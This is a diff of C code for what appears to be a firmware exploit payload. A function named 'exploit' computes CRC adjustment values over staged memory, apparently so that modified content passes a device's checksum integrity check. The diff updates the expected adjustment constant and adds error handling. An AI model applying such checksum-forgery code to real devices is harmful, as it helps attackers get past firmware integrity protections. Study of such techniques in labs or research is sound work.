@@ -4,7 +4,7 @@
 #include "crc_runtime.h"
 
 #define ORIGINAL_ADJUST 0x0962887Fu
-#define CRC_CANDIDATE_ADJUST 0xD1F4CE24u
+#define CRC_CANDIDATE_ADJUST 0x414F47CCu
 #define CRC_MAGIC_OFFSET 0x7E00u
 
 void exploit(void) __attribute__((section(".text.entry"),used,noreturn));
@@ -38,13 +38,18 @@ void exploit(void) {
   }
 
   capture_dcra(&entry_ctl, &entry_cout);
+  if ((entry_ctl & 3u) != 0u) {
+    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 6u, entry_ctl, &guard);
+  }
   prefix_crc = crc_prefix_sw(0u, &guard);
   new_adjust = crc_adjustment(prefix_crc);
   live_sw = crc_full_sw(0u, 0u, &guard);
   final_sw = crc_full_sw(1u, new_adjust, &guard);
   live_dcra = dcra_full_raw(0u, 0u, &guard);
   final_dcra = dcra_full_raw(1u, new_adjust, &guard);
-  restore_dcra(entry_ctl, entry_cout);
+  if (restore_dcra(entry_ctl, entry_cout) != 0u) {
+    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 7u, entry_ctl, &guard);
+  }
   staged_crc = crc_region(SRAM_BUFFER, TARGET_LENGTH, &guard);
 
   if (new_adjust != CRC_CANDIDATE_ADJUST || live_sw != live_dcra
